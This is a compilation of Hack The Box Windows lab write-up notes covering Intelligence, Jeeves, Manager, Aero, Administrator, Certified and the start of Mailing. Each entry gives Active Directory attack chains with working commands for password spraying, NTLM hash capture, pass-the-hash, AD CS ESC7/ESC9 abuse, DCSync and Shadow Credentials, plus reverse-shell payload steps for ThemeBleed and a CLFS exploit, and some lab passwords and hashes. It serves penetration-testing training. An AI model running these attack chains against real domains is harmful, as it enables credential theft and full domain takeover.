- `wget https://raw.githubusercontent.com/lclevy/firepwd/master/requirements.txt`
- `cme smb streamio.htb -u system-users.txt -p system-passwords.txt`
- `ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w`

### Artifacts and exact search anchors

`key4.db`, `firepwd.py`, `logins.json`, `streamio.htb`, `bloodhound.py`, `setup.py`, `dc.streamio.htb`, `PowerView.ps1`, `ms-MCS-AdmPwd`, `C:\Users\martin\Desktop`

Open the PDF around page **23** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 46- Intelligence

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Intelligence.md) · [Official PDF](./htb-writeups/Intelligence.pdf)

### Machine path overview

Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by bruteforcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.

### Remote enumeration and foothold checks

- Brute-force the predictable dated PDF filename pattern on IIS rather than relying on directory discovery alone.
- Extract both PDF text and metadata; documents provide a default password while author metadata yields candidate AD usernames.
- Build the username list from metadata and password-spray the discovered default password to find a valid account.
- Enumerate SMB shares with the valid user and inspect scripts/documents, especially the scheduled PowerShell DNS/web-check script.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Post-foothold local enumeration and lateral movement

- Read the scheduled PowerShell script's logic: it resolves domain hostnames and makes authenticated web requests as a service user.
- Use ADIDNS permissions to add a malicious A record/hostname that resolves to the attacker, then run Responder/HTTP capture before the scheduled check.
- Crack the captured second user's NetNTLM hash and re-enumerate AD rights with that identity.
- Read the gMSA managed password allowed to the second user and derive the gMSA NT hash.
- The scheduled downdetector.ps1 runs every five minutes and only requests DNS records whose names start with web; create an ADIDNS record such as web1 pointing to the attacker before starting Responder.

### User path

**Memory chain:** default credentials → SMB enumeration → source-code review → group-membership abuse → NTLM relay/coercion → password cracking

- To speed up the process, we use the -P option to run twenty parallel wget processes with xargs . d=2020-01-01; while [ "$d" != `date -I` ]; do echo "http://10.10.10.248/Documents/$dupload.pdf"; done | xargs -n 1 -P 20 wget < list 2>/dev/null Several files are downloaded.
- can leverage the permission (granted by default to authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone to add a new record that points to our own IP address.

#### Commands and PDF search strings

- `nmap -sC -sV -p$ports 10.10.10.248`
- `john --wordlist=/usr/share/wordlists/rockyou.txt hash`

### Artifacts and exact search anchors

`intelligence.htb`, `smbclient.py`, `downdetector.ps1`, `dnstool.py`, `/usr/share/wordlists/rockyou.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- The gMSA has constrained delegation to a service on the domain controller; request the appropriate S4U service ticket while impersonating Administrator.
- Synchronize time and use the delegated ticket/cache with Kerberos-aware remote execution to obtain administrative access on the DC.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- If an account/group can read a gMSA password, retrieve `msDS-ManagedPassword`, derive the NT hash, and authenticate as the managed service account.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → delegation/RBCD → WMI/PowerShell remoting → Kerberos ticket abuse

- One of the internal documents retrieved during the initial phase hinted at potential security issues with service accounts.

#### Commands and PDF search strings

- `bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All`
- `sudo ntpdate -s 10.10.10.248`

### Artifacts and exact search anchors

`intelligence.htb`, `gMSADumper.py`, `/etc/hosts`, `getST.py`, `dc.intelligence.htb`, `wmiexec.py`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 47- Jeeves

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Jeeves.md) · [Official PDF](./htb-writeups/Jeeves.pdf)

### Machine path overview

Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.

### Remote enumeration and foothold checks

- Scan all exposed web ports separately; the useful Jenkins instance is on Jetty, not the default IIS site.
- Directory fuzz the Jetty service and discover the unlinked /askjeeves/ path; do not assume Jenkins must appear at the root.
- Create a Jenkins job with an Execute Windows batch command build step for command execution.
- Windows Defender blocks common Metasploit payloads here; transfer a standalone Windows netcat and use the Jenkins job to launch the callback as kohsuke.

### Post-foothold local enumeration and lateral movement

- Browse kohsuke's Documents directory and collect CEH.kdbx; it is the decisive local artifact.
- Transfer the binary KeePass database without corruption, extract its hash with keepass2john, and crack it with John.
- Inspect every KeePass entry type: the important Backup stuff entry stores an Administrator NTLM hash, not a plaintext password.

### User path

**Memory chain:** pass-the-hash → reverse shell → KeePass database recovery

- Skills Required Skills Learned ● Intermediate knowledge of Windows ● Obtaining shell through Jenkins ● Knowledge of basic web fuzzing ● Techniques for bypassing Windows techniques Defender ● Pass-the-hash attacks ● Enumerating alternate data streams Enumeration Nmap Nmap reveals an IIS server, RPC, Microsoft-ds and a Jetty server.
- Dirbuster Fuzzing the Jetty server reveals an ​askjeeves​ directory which contains a Jenkins server.
- Exploitation Jenkins Netcat for Windows: ​https://eternallybored.org/misc/netcat/ Using Jenkins to acquire a shell is fairly straightforward, however there is an antivirus running on the target which prevents most Metasploit-based payloads from running.
- Receiving the connection with ​nc -nvlp 1234​ grants access as the ​kohsuke​ user.
- A bit of browsing quickly reveals a ​CEH.kdbx​ file in the ​Documents ​directory.

#### Commands and PDF search strings

- `Nmap reveals an IIS server, RPC, Microsoft-ds and a Jetty server.`

### Artifacts and exact search anchors

`CEH.kdbx`

Open the PDF around page **2** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use pass-the-hash (the writeup uses pth-winexe) with the KeePass Administrator NTLM hash to obtain an Administrator shell.
- Administrator access is not the end: the root flag is hidden in an NTFS alternate data stream on hm.txt.
- Run dir /R to enumerate streams, then read hm.txt:root.txt with PowerShell Get-Content -Stream root.txt.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Root / Administrator path

**Memory chain:** KeePass database recovery → password cracking → pass-the-hash

- KeePass Database Cracking the KeePass database password is fairly simple.
- With the database at hand, cracking is as easy as extracting the hash with ​keepass2john jeeves.kdbx > jeeves.hash​ and running John with ​john jeeves.hash Once the database is open, several passwords are accessible, however only the ​Backup stuff entry is important.
- Pass the Hash The ​Backup stuff​ entry in the KeePass file is an NTLM hash for the Administrator user.
- Using the pass-the-hash technique allows for fairly simple spawning of a session.
- The command pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb e81fe00 //10.10.10.63 cmd​ will immediately grant a shell as the administrator.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`jeeves.kdbx`, `CEH.kdbx`

Open the PDF around page **6** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 48- Manager

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Manager.md) · [Official PDF](./htb-writeups/Manager.pdf)

### Machine path overview

Manager is a medium difficulty Windows machine which hosts an Active Directory environment with AD CS (Active Directory Certificate Services), a web server, and an SQL server. The foothold involves enumerating users using RID cycling and performing a password spray attack to gain access to the MSSQL service. The xp_dirtree procedure is then used to explore the filesystem, uncovering a website backup in the web-root. Extracting the backup reveals credentials that are reused to WinRM to the server. Finally, the attacker escalates privileges through AD CS via ESC7 exploitation.

### Remote enumeration and foothold checks

- Test an SMB null session: even when listed shares contain nothing useful, null RPC access can still permit RID cycling.
- Run impacket-lookupsid anonymous@manager.htb -no-pass, filter SidTypeUser entries, and preserve exact case when building usernames.
- Spray username=password with NetExec --no-bruteforce so each username is paired only with itself; operator:operator is valid.
- Use Windows authentication to MSSQL as operator, not SQL-local authentication.
- When xp_cmdshell is unavailable, use xp_dirtree to enumerate C:\ and C:\inetpub\wwwroot; find website-backup-27-07-23-old.zip.
- Download the backup over HTTP and include hidden files when extracting/listing it; .old-conf.xml contains Raven's LDAP bind credential.
- Reuse Raven's credential over WinRM for the foothold.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
- Abuse MSSQL `xp_dirtree` for filesystem discovery or forced SMB authentication. Check web roots, backups, configuration files, and UNC paths; it often works without `xp_cmdshell`.
- Inspect IIS bindings and configuration (`applicationHost.config`, site-level `web.config`, app pools, physical paths, connection strings, and internal host headers). A second binding/application can expose a hidden site or stronger execution identity.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- Run Certipy vulnerable enumeration with Raven and inspect CA-level permissions, not only template findings.
- Recognize ESC7 because Raven has ManageCA even though Certipy may report that no vulnerable templates are directly available.
- Add Raven as a CA officer and enable the SubCA template before making the certificate request.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → group-membership abuse → password spraying → database enumeration → configuration-file secrets → WinRM

- Since RIDs are assigned sequentially to users and groups in Windows, this technique can reveal valid user accounts.
- By combining RID cycling with null session access to share listings, an attacker can gather information about existing users on the system, aiding further exploitation efforts.
- Therefore, let's attempt a password spray attack using the traditional username = password combination.
- can employ the netexec (formerly known as crackmapexec ) utility to attempt SMB authentication against the target, using the same file usernames.txt containing the username list for both the username and password wordlist parameters.
- Foothold Let's attempt to access the MSSQL Server, as there may be some level of access to the filesystem available.

#### Commands and PDF search strings

- `nmap -p- --min-rate=1000 -sV 10.10.11.236`
- `smbclient -L \\\\10.10.11.236\\ -N`
- `impacket-lookupsid anonymous@manager.htb -no-pass`
- `netexec smb 10.10.11.236 -u usernames.txt -p usernames.txt --no-bruteforce`
- `impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth`
- `wget http://10.10.11.236/website-backup-27-07-23-old.zip`
- `evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'`
- `Evil-WinRM shell v3.5`

### Artifacts and exact search anchors

`manager.htb`, `/etc/hosts`, `xp_dirtree`, `web.config`, `website-backup-27-07-23-old.zip`, `old-conf.xml`, `dc01.manager.htb`, `C:\Users\Raven\Documents`, `c:\users\raven\desktop\user.txt`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Request a SubCA certificate for administrator@manager.htb; the expected denial still returns a request ID and saved private key.
- Use Raven's officer/ManageCA rights to manually issue the denied request, then retrieve that exact request ID so Certipy combines it with the private key.
- If cleanup removes officer rights, repeat the add-officer step before issuing.
- Synchronize time when PKINIT returns KRB_AP_ERR_SKEW, authenticate with administrator.pfx to recover the NT hash, and use it over WinRM.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Root / Administrator path

**Memory chain:** AD CS/certificate abuse → subdomain enumeration → LDAP enumeration → private-key discovery → PFX/certificate-key recovery → Kerberos ticket abuse → WinRM

- A detailed explaination about the exploitation process for the ESC7 scenario can be found here.
- have Manage Certificates permission, granted through ManageCA , and have ensured that the SubCA template is enabled.
- Now let us request a certificate based on the SubCA template.

#### Commands and PDF search strings

- `Certipy v4.7.0 - by Oliver Lyak (ly4k)`
- `sudo ntpdate -s manager.htb`
- `evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef`
- `Evil-WinRM shell v3.5`

### Artifacts and exact search anchors

`dc01.manager.htb`, `MANAGER.HTB`, `13.key`, `administrator.pfx`, `C:\Users\Administrator\Documents`, `c:\administrator\desktop\root.txt`, `c:\users\administrator\desktop\root.txt`

Open the PDF around page **7** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 49- Aero

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Aero.md) · [Official PDF](./htb-writeups/Aero.pdf)

### Machine path overview

Aero is a medium-difficulty Windows machine featuring two recent CVEs: CVE-2023-38146 , affecting Windows 11 themes, and CVE-2023-28252 , targeting the Common Log File System (CLFS). Initial access is achieved through the crafting of a malicious payload using the ThemeBleed proof-of-concept, resulting in a reverse shell. Upon gaining a foothold, a CVE disclosure notice is found in the user's home directory, indicating vulnerability to CVE-2023-28252 . Modification of an existing proof-of-concept is required to facilitate privilege escalation to administrator level or code execution as NT Authority\SYSTEM .

### Remote enumeration and foothold checks

- Read the IIS landing page closely: the invitation to upload custom Windows themes is the exploitation clue, not ordinary directory discovery.
- Match the theme-upload workflow to ThemeBleed/CVE-2023-38146 and build the malicious .theme plus DLL with the x64 proof of concept.
- The ThemeBleed server needs TCP 445 on the attacker Windows host; stop/disable the local Server service and reboot if it already owns that port.
- Replace the proof-of-concept DLL action with a reverse-shell payload and run the ThemeBleed server and listener simultaneously before uploading the theme.
- The ThemeBleed payload DLL must export VerifyThemeVersion, be compiled in Release x64, then be renamed exactly stage_3 and copied into the ThemeBleed data directory; merely building a generic reverse-shell DLL will not make the PoC load it.

### Post-foothold local enumeration and lateral movement

- Enumerate the landed user's home folders immediately; Documents contains CVE-2023-28252_Summary.pdf, which is the intended local escalation clue.
- If downloading the PDF is awkward, Base64-encode it with PowerShell, decode locally, and search the disclosed CVE rather than running broad automated enumeration only.

### User path

**Memory chain:** web shell/RCE → reverse shell → group-membership abuse

- There is a key piece of information on this page: As we start to develop our catalog of themes please upload your own to share with the community!
- then open up rev.cpp and add the implementation for the above function, which in this case will be a reverse shell payload pinging back to our machine.
- 1>All functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
- PS C:\users\attacker\Desktop\ThemeBleed> .\ThemeBleed.exe server Server started In a separate shell we start a Netcat listener, on the same port we specified in the DLL payload.
- C:\Windows\system32>whoami whoami aero\sam.emerson The user flag can be found in C:\users\sam.emerson\Desktop\user.txt .

#### Commands and PDF search strings

- `Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds`

### Artifacts and exact search anchors

`C:\\WINDOWS\\SYSTEM32\\CMD.EXE`, `C:\Users\attacker\source\repos\Dll3\x64\Release\Dll3.dll`, `Dll3.dll`, `C:\Users\attacker\source\repos\Dll3\x64\Release\`, `C:\Users\attacker\Desktop\ThemeBleed\data`, `c:\users\attacker\Desktop\ThemeBleed`, `C:\Users\attacker\Downloads`, `C:\Windows\system32`, `C:\users\sam.emerson\Desktop\user.txt`

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use a CVE-2023-28252 Common Log File System proof of concept that matches the Windows build and x64 architecture.
- Modify the PoC's benign notepad launch to execute the encoded PowerShell reverse shell, rebuild the Release x64 target, transfer it, and run it with a listener ready.
- Verify the callback context explicitly with whoami; successful CLFS exploitation should execute as NT AUTHORITY\SYSTEM.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.

### Root / Administrator path

**Memory chain:** CVE-2023-28252 → reverse shell

- Basic enumeration of this user's home directory reveals a PDF in the Documents folder, labelled CVE-202328252_Summary.pdf .
- This vulnerability has been used as a means for attackers to gain unauthorized access to Windows systems, making it imperative for us to apply the necessary patch to safeguard our infrastructure.
- Review and Monitoring: In addition to patching, we should conduct a thorough review of our server logs to check for any signs of suspicious activity or unauthorized access.
- A quick payload generation for a PowerShell reverse shell payload can be found at: https://www.revshells.com/ and for our purposes we'll use PowerShell #3 (Base64) .
- The root flag can be found at C:\Users\Administrator\Desktop\root.txt .

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`CVE-2023-28252`, `C:\Users\attacker\Desktop\CVE-2023-28252\clfs_eop\clfs_eop.cpp(617`, `C:\Users\attacker\Desktop\CVE-2023-28252\clfs_eop\clfs_eop.cpp(1449`, `C:\Users\attacker\Desktop\CVE-2023-28252\clfs_eop\clfs_eop.cpp(1465`, `C:\Users\attacker\Desktop\CVE-2023-28252\clfs_eop\clfs_eop.cpp(1471`, `C:\Users\attacker\Desktop\CVE-2023-28252\x64\Release\clfs_eop.exe`, `C:\Users\attacker`, `C:\Users\attacker\Desktop\CVE-2023-28252\x64\Release\`, `C:\Users\attacker\Desktop\CVE-2023-28252\x64\Release`, `C:\Users\sam.emerson\Documents`, `C:\Users\attacker\Downloads`, `C:\Users\Public`, `C:\Users\Public\39`, `C:\Users\Public\39.blf`, `C:\Users\Public\.p_39`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 50- Administrator

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Administrator.md) · [Official PDF](./htb-writeups/Administrator.pdf)

### Machine path overview

Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user olivia has GenericAll permissions over michael , allowing us to reset his password. With access as michael , it is revealed that he can force a password change on the user benjamin , whose password is reset. This grants access to FTP where a backup.psafe3 file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user emily . Further enumeration shows that emily has GenericWrite permissions over the user ethan , allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for ethan , who is found to have DCSync rights ultimately allowing retrieval of the Administrator account hash and full domain compromise.

### Remote enumeration and foothold checks

- Use the supplied Olivia credential to collect all BloodHound relationships; do not focus only on group membership—inspect Outbound Object Control and transitive control.
- Olivia has GenericAll over Michael: reset Michael's domain password and re-run object-control analysis as Michael.
- Michael has ForceChangePassword over Benjamin: use PowerView/Set-DomainUserPassword with Michael's credential rather than assuming Michael is the final foothold.
- Benjamin's access is valuable because FTP is exposed; authenticate to FTP and retrieve backup.psafe3.
- Convert/crack the Password Safe database and spray the recovered entries against domain services; Emily is the useful credential.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- At every new user, mark the account owned in BloodHound and re-check outbound/transitive object control; the path is Olivia -> Michael -> Benjamin -> Emily -> Ethan.
- Preserve the cracked Password Safe entries as username/password pairs and test them selectively against SMB/WinRM before discarding any as stale.

### User path

**Memory chain:** FTP → LDAP enumeration → SMB enumeration → BloodHound path analysis → ACL abuse → WinRM → GPP cpassword recovery → password cracking

- then start the neo4j service and upload the data to BloodHound . sudo neo4j console [sudo] password for fury: Directories in use: home: /usr/share/neo4j config: /usr/share/neo4j/conf logs: /etc/neo4j/logs plugins: /usr/share/neo4j/plugins import: /usr/share/neo4j/import data: /etc/neo4j/data certificates: /usr/share/neo4j/certificates licenses: /usr/share/neo4j/licenses run: /var/lib/neo4j/run Starting Neo4j.
- From the BloodHound data, we can see that user Benjamin is a member of the Share Moderators group.
- 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp> get Backup.psafe3 local: Backup.psafe3 remote: Backup.psafe3 229 Entering Extended Passive Mode (|||57247|) 150 Opening ASCII mode data connection.
- 100% |*******************************************************************************| 952 5.80 Here, we discover a backup.psafe3 file, a Password Safe database used by the Password Safe application to store passwords and other sensitive data securely using encryption.
- can now open the file using Password Safe and find a list of usernames.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.42`
- `evil-winrm -i 10.10.11.42 -u olivia`
- `evil-winrm -i 10.10.11.42 -u michael`
- `hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt`
- `netexec smb 10.10.11.42 -u user.txt -p pass.txt`
- `evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

### Artifacts and exact search anchors

`administrator.htb`, `/etc/hosts`, `bloodhound.py`, `dc.administrator.htb`, `/usr/share/neo4j`, `/usr/share/neo4j/conf`, `/etc/neo4j/logs`, `/usr/share/neo4j/plugins`, `/usr/share/neo4j/import`, `/etc/neo4j/data`, `/usr/share/neo4j/certificates`, `/usr/share/neo4j/licenses`, `/var/lib/neo4j/run`, `C:\Users\olivia\Documents`, `C:\Users\michael\Documents`, `PowerView.ps1`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\emily\Desktop\user.txt`, `C:\Users\emily\Documents`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Emily has GenericWrite over Ethan; set a controlled SPN on Ethan and perform targeted Kerberoasting rather than a domain-wide roast only.
- Crack Ethan's service ticket and authenticate as Ethan, then verify his directory-replication rights.
- Use Ethan's DCSync rights with secretsdump to retrieve the Administrator NT hash and use pass-the-hash for the final administrative shell.
- If targetedKerberoast returns KRB_AP_ERR_SKEW while targeting Ethan, synchronize the attacker clock with the DC (the writeup uses ntpdate against 10.10.11.42) and rerun it; otherwise the GenericWrite/SPN path appears broken.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → ACL abuse → Kerberoasting → Kerberos ticket abuse → password cracking → DCSync/secrets dump → WinRM

- The BloodHound output under Transitive Object Control for Emily shows that she has the GenericWrite permission set on the user Ethan .
- This technique lets us impersonate a Domain Controller and request NTLM password hashes for domain users, including privileged accounts.
- Next, we log in using the Administrator's hash and retrieve the root flag from C:\Users\Administrator\Desktop\root.txt . evil-winrm -i 10.10.11.42 -u Administrator -H'3dc553ce4b9fd20bd016e098d2d2fd2e' <...SNIP...> Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents>

#### Commands and PDF search strings

- `hashcat -a 0 -m 13100 ethan /usr/share/wordlists/rockyou.txt`
- `secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@10.10.11.42`
- `evil-winrm -i 10.10.11.42 -u Administrator -H'3dc553ce4b9fd20bd016e098d2d2fd2e'`

### Artifacts and exact search anchors

`targetedKerberoast.py`, `administrator.htb`, `/usr/share/wordlists/rockyou.txt`, `secretsdump.py`, `C:\Users\Administrator\Desktop\root.txt`, `C:\Users\Administrator\Documents`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 51- Certified

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Certified.md) · [Official PDF](./htb-writeups/Certified.pdf)

### Machine path overview

Certified is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the management_svc account, ACLs (Access Control Lists) over privileged objects are enumerated leading us to discover that judith.mader which has the write owner ACL over management group, management group has GenericWrite over the management_svc account where we can finally authenticate to the target using WinRM obtaining the user flag. Exploitation of the Active Directory Certificate Service (ADCS) is required to get access to the Administrator account by abusing shadow credentials and ESC9 .

### Remote enumeration and foothold checks

- Collect BloodHound with the provided Judith credential and inspect the exact chain: Judith WriteOwner on Management group; Management GenericWrite on management_svc; management_svc CanPSRemote.
- Set Judith as owner of the Management group, grant Judith FullControl with dacledit, then add Judith to the group; ownership alone does not grant the needed write operations.
- Use the group's GenericWrite over management_svc for Shadow Credentials with pywhisker.
- Use the generated PFX with PKINITtools to request a TGT, export the ccache, recover management_svc's NT hash with getnthash, and pass the hash over WinRM.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- For Shadow Credentials, confirm write access to `msDS-KeyCredentialLink`, add a key credential, obtain a TGT/NT hash with PKINIT, and clean up the added credential afterward.

### Post-foothold local enumeration and lateral movement

- Re-open BloodHound as management_svc: it has GenericAll over ca_operator, so repeat the Shadow Credentials -> PFX -> TGT -> NT-hash sequence for ca_operator.
- Keep separate ccache files and KRB5CCNAME values for management_svc and ca_operator to avoid authenticating as the wrong principal.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → group-membership abuse → BloodHound path analysis → ACL abuse → WinRM → shadow credentials/PKINIT → PFX/certificate-key recovery → AD CS/certificate abuse → Kerberos ticket abuse

- The management_svc has CanPSRenote attribute set, which means that the user can log in to the target (via WinRM ) Foothold First, we abuse the WriteOwner ACL to get full control over the management group and add ourselves to that group.
- Then, we add ourselves to the target group. net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb" Once we are in the management group, we abuse the GenericWrite ACL to get control of the management_svc account by adding shadow credentials.
- Therefore, we use the same method we used before to access the ca_operator account using pywhisker for Shadow Credentials .

#### Commands and PDF search strings

- `bloodhound-python -d certified.htb`
- `evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584`

### Artifacts and exact search anchors

`certified.htb`, `DC01.certified.htb`, `/etc/hosts`, `dacledit.py`, `/opt/impacket-with-dacledit/examples/dacledit.py`, `dacledit-20250311-162610.bak`, `/opt/pywhisker/pywhisker.py`, `pywhisker.py`, `vGRMeeb9.pfx`, `/opt/PKINITtools/gettgtpkinit.py`, `gettgtpkinit.py`, `getnthash.py`, `/opt/PKINITtools/getnthash.py`, `C:\Users\management_svc\Desktop\user.txt`, `C:\Users\management_svc\Documents`, `hHJGb6pJ.pfx`

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Confirm AD CS with nxc ldap -M adcs, then run certipy find -vulnerable as ca_operator; the CertifiedAuthentication template is vulnerable to ESC9.
- Use management_svc's control to change ca_operator's UPN to Administrator, then request a certificate through the vulnerable template as ca_operator.
- After issuing `administrator.pfx`, restore ca_operator's UPN to `ca_operator@certified.htb` before running `certipy auth -pfx administrator.pfx`; this ordering is required for the working ESC9 sequence, not optional cleanup.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Root / Administrator path

**Memory chain:** SMB enumeration → LDAP enumeration → AD CS/certificate abuse → PFX/certificate-key recovery → private-key discovery → Kerberos ticket abuse → WinRM

- This will create a certificate ( administrator.pfx ), which can be used to authenticate to the Domain Controller as the Administrator user.

#### Commands and PDF search strings

- `nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M`
- `certipy find -u ca_operator@certified.htb -hashes`
- `Certipy v4.8.2 - by Oliver Lyak (ly4k)`
- `evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34`

### Artifacts and exact search anchors

`certified.htb`, `DC01.certified.htb`, `administrator.pfx`, `C:\Users\Administrator\Desktop\root.txt`, `C:\Users\Administrator\Documents`

Open the PDF around page **7** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 52- Mailing

**Target:** Windows · Easy

[Detailed notes](./htb-writeups/Mailing.md) · [Official PDF](./htb-writeups/Mailing.pdf)

### Machine path overview

Mailing is an easy Windows machine that runs hMailServer and hosts a website vulnerable to Path Traversal . This vulnerability can be exploited to access the hMailServer configuration file, revealing the Administrator password hash. Cracking this hash provides the Administrator password for the email account. We leverage CVE-2024-21413 in the Windows Mail application on the remote host to capture the NTLM hash for user maya . We can then crack this hash to obtain the password and log in as user maya via WinRM. For privilege escalation, we exploit CVE-20232255 in LibreOffice .

### Remote enumeration and foothold checks

- Validate path traversal with a harmless Windows file, then target the product-specific hMailServer configuration at C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini.
